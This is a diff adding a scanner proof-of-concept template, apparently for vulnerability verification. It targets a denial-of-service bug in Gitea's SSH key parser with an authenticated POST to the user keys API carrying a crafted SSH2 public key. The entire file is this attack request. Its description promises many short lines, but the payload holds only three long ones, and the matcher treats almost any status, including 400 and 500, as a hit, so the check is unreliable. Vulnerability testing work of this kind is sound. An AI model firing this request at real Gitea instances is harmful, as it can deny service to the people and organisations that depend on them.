@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "向 Gitea API 提交大量短行的 RFC 4716 SSH2 公钥，触发 parseKeyString 的 O(N²) 字符串拼接，验证拒绝服务漏洞"
+id = "POC-AVE-2026-0644"
+name = "Gitea SSH Key Parser Denial of Service PoC"
+severity = "medium"
+tags = ["ave-2026-0644"]
+vuln_id = [
+    "CVE-2026-56657",
+    "AVE-2026-0644",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/user/keys"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"key":"---- BEGIN SSH2 PUBLIC KEY ----\\nComment: dos\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n---- END SSH2 PUBLIC KEY ----"}'
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    201,
+    400,
+    422,
+    500,
+]
+type = "status"
